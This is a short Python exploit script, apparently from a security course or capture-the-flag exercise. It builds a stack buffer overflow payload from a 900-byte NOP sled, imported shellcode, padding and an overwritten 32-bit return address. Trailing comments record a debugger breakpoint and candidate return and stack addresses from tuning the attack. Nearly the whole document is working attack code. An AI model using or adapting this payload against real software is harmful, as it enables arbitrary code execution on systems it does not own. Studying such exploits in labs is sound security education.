from shellcode import shellcode
from struct import pack 
import sys

def main():
    for i in range(900):
        sys.stdout.buffer.write(b"\x90")
    sys.stdout.buffer.write(shellcode)
    for i in range(113):
        sys.stdout.buffer.write(b"\x90")
    sys.stdout.buffer.write(pack("<I",0xfffe87ff))    
   
if __name__ == "__main__":
    main()

#break *0x08049d84


#all add up to 1036 with size 2500

    #return addr
#0xfffef92c
#0xfffef93c
#0xfffef97c
#0xfffef89c
#0xfffef91c
# 0xfffef8ac

    #stack
# 0xfffef520
# 0xfffef530
# 0xfffef570
# 0xfffef490
# 0xfffef510
# 0xfffef4a0